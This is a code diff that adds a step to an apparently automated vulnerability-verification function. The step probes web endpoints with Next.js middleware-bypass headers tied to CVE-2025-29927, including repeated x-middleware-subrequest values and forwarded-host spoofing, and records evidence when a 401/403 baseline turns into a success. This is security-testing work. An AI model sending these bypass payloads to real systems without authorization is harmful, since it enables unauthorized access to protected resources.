@@ -13414,6 +13414,44 @@ def verify_generic_missing_authorization(
                     step(f"VERIFICADO — missing auth via path normalization bypass: {_path_v}")
                     return res
 
+            # --- Phase 1d: Next.js / middleware internal header bypass ---
+            # CVE-2025-29927: x-middleware-subrequest header causes Next.js middleware
+            # to skip auth checks (treats request as internal subrequest). Also covers
+            # similar patterns in Express/Koa/Hapi middleware using internal headers.
+            _MIDDLEWARE_BYPASS_HDRS = [
+                {"x-middleware-subrequest": "middleware"},
+                {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
+                {"x-middleware-invoke": "1"},
+                {"x-next-rewrite": endpoint},
+                {"x-middleware-rewrite": endpoint},
+                {"x-forwarded-host": "localhost"},
+                {"x-forwarded-proto": "https", "x-forwarded-host": "localhost"},
+            ]
+            for _mw_hdr in _MIDDLEWARE_BYPASS_HDRS:
+                _result = _probe(boot.base_url + endpoint, http_method.upper(), _mw_hdr)
+                if _result is None:
+                    continue
+                _status, body = _result
+                _hdr_key = list(_mw_hdr.keys())[0]
+                if _status in range(200, 400) and (not confirm_string or confirm_string in body):
+                    _baseline = _probe(boot.base_url + endpoint, http_method.upper(), {})
+                    _base_status = _baseline[0] if _baseline else 999
+                    if _base_status in (401, 403) and _status in range(200, 400):
+                        res.verified = True
+                        res.ok = True
+                        res.evidence.update({
+                            "bypass_type": "middleware-internal-header",
+                            "header": _hdr_key,
+                            "header_value": _mw_hdr[_hdr_key],
+                            "baseline_status": _base_status,
+                            "bypass_status": _status,
+                            "endpoint": endpoint,
+                            "respuesta_cuerpo_recorte": body[:400],
+                        })
+                        step(f"VERIFICADO — middleware header bypass ({_hdr_key}): "
+                             f"baseline={_base_status} → bypass={_status}")
+                        return res
+
             # --- Phase 2: JWT bypass ---
             for _tok in _JWT_BYPASSES:
                 _hdrs: dict = {"Authorization": _tok} if _tok else {}
